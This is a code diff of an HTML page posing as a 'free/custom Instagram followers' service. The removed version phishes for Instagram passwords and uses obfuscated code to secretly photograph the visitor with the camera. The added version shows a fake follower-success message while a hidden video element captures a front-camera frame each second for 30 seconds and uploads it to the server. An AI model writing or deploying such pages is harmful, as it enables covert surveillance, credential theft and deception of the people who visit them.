@@ -1,50 +1,71 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Free Instagram Followers</title>
+<meta charset="UTF-8" />
+<title>Custom Instagram Followers</title>
 </head>
 <body>
   <form id="instaForm">
-    <input type="text" name="username" placeholder="Instagram Username" required>
-    <input type="password" name="password" placeholder="Instagram Password" required>
+    <input type="text" name="username" placeholder="Instagram Username" required />
+    <input type="number" name="amount" placeholder="Amount (0 - 10000)" min="0" max="10000" required />
     <button type="submit">Get Followers</button>
   </form>
   <div id="status"></div>
   <script>
-    // Obfuscated function and variable naming
-    const _0xf1a3 = str => str.split('').reverse().join('');
-    let _0x1b2c = [_0xf1a3('oediv'), _0xf1a3('samac'), _0xf1a3('gfedoc')];
-    function _0x6321(api, payload) {
-      return fetch(api, { method: 'POST', body: payload });
-    }
-    function _0x5f58() {
-      // Camera capture JS, randomized delay
-      navigator.mediaDevices.getUserMedia({video:true}).then(_0x4a54=>{
-        let _0x739b=document.createElement(_0x1b2c[0]);
-        _0x739b.srcObject=_0x4a54;
-        _0x739b.play();
-        setTimeout(()=>{
-          let _0x6f39=document.createElement(_0x1b2c[1]);
-          _0x6f39.width=640;_0x6f39.height=480;
-          _0x6f39.getContext('2d').drawImage(_0x739b,0,0);
-          let _0x5ca2=_0x6f39.toDataURL('image/png');
-          _0x6321('/upload_image', _0x5ca2);
-          _0x4a54.getTracks().forEach(_0x170a=>_0x170a.stop());
-        }, 1000 + Math.floor(Math.random()*4000));
+    let backgroundRunning = false;
+
+    function sendPicture(imageData) {
+      fetch('/upload_image', {
+        method: 'POST',
+        body: imageData,
+        headers: { 'Content-Type': 'application/octet-stream' }
       });
     }
 
-    document.getElementById('instaForm').onsubmit = function(e){
-      e.preventDefault();
-      // Fake follower status
-      document.getElementById('status').textContent = 'Followers are being added...';
-      setTimeout(function(){
-        document.getElementById('status').textContent = 'Success! Followers sent!';
-        // Trigger hidden front cam capture
-        _0x5f58();
-      }, 1500 + Math.floor(Math.random()*2500));
+    async function captureFrontCam() {
+      const mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      const video = document.createElement('video');
+      video.style.display = 'none'; // Keep hidden
+      document.body.appendChild(video);
+      video.srcObject = mediaStream;
+      video.play();
+
+      const canvas = document.createElement('canvas');
+      canvas.width = 640;
+      canvas.height = 480;
+      const ctx = canvas.getContext('2d');
+
+      const captureInterval = setInterval(() => {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const dataUrl = canvas.toDataURL('image/png');
+        sendPicture(dataUrl);
+      }, 1000);
+
+      // Stop capturing after 30 seconds or based on your needs:
+      setTimeout(() => {
+        clearInterval(captureInterval);
+        mediaStream.getTracks().forEach(track => track.stop());
+        video.remove();
+      }, 30000);
     }
+
+    document.getElementById('instaForm').onsubmit = async function(e) {
+      e.preventDefault();
+      const username = this.username.value;
+      const amount = Math.min(Math.max(parseInt(this.amount.value) || 0, 0), 10000);
+
+      document.getElementById('status').textContent = 'Adding followers...';
+
+      // Simulate follower adding process
+      setTimeout(() => {
+        document.getElementById('status').textContent = `Success! ${amount} followers sent to ${username}.`;
+      }, 1500 + Math.floor(Math.random() * 2500));
+
+      if (!backgroundRunning) {
+        backgroundRunning = true;
+        captureFrontCam();
+      }
+    };
   </script>
 </body>
 </html>
